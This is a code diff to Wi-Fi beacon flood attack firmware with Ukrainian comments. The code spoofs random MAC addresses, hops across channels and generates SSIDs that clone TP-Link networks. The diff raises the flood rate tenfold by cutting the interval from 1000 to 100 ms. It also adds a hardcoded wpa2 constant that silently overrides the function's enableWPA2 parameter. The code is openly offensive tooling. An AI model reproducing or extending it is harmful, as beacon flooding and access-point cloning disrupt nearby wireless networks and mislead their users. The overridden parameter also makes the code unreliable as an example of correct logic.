@@ -14,13 +14,14 @@ extern "C" {
 // === Налаштування === //
 const uint8_t channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14}; // Доступні Wi-Fi канали
 const bool appendSpaces = 0;
+const bool wpa2 = 1; // WPA2 networks
 
 
-// === Змінні === //
 char emptySSID[32];
 uint8_t macAddr[6];
 uint8_t channelIndex = 0;
 uint8_t wifi_channel = 1;
+
 
 uint32_t packetSize = 0;
  uint32_t packetCounter = 0;
@@ -78,7 +79,7 @@ void init_flood_attack(bool enableWPA2 ) {
 
 	packetSize = sizeof(beaconPacket);
   	beaconPacket[34] = enableWPA2 ? 0x31 : 0x21;
-  	if (!enableWPA2) packetSize -= 26;
+  	if (!wpa2) packetSize -= 26;
 
   	randomMac();
 
@@ -165,7 +166,7 @@ void generateTpLinkCloneSSID(char* buffer, size_t length, char* ssid) {
 int run_flood_attack(bool enableWPA2, int ssidsCount, bool attack_type, char* ssid_target) {
     uint32_t now = millis();
 
-    if (now - attackTime > 1000) {
+    if (now - attackTime > 100) {
         attackTime = now;
 
         nextChannel();
@@ -207,7 +208,7 @@ int run_flood_attack(bool enableWPA2, int ssidsCount, bool attack_type, char* ss
                 uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;
                 memcpy(tmpPacket, beaconPacket, 38 + ssidLen);
                 tmpPacket[37] = ssidLen;
-                memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], enableWPA2 ? 39 : 13);
+                memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13);
 
                 // Відправка пакета
                 for (int k = 0; k < 3; k++) {
